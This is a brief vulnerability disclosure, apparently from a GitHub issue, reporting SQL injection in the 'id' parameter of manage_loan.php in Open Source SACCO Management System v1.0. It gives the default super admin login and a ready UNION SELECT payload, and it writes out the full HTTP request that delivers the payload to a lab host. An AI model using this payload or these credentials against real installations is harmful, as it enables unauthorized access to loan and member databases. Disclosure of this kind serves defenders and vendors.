# Open Source SACCO Management System v1.0 by mayuri_k has SQL injection

BUG_Author: 足够努力。

Login account: mayuri.infospace@gmail.com/admin (Super Admin account)

vendors: https://www.sourcecodester.com/php/15372/open-source-sacco-management-system-free-download.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /sacco_shield/manage_loan.php

Vulnerability location: /sacco_shield/manage_loan.php?id=, id

dbname = sacco,length=5

[+] Payload: /sacco_shield/manage_loan.php?id=-1%20union%20select%201,2,3,4,5,6,7,8,9,10--+ // Leak place ---> id

```sql
GET /sacco_shield/manage_loan.php?id=-1%20union%20select%201,2,3,4,5,6,7,8,9,10--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=5g4g4dffu1bkrg9jm7nr42ori2
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/191198021-a34e185f-3d27-40ee-8984-73cdae40cc52.png)
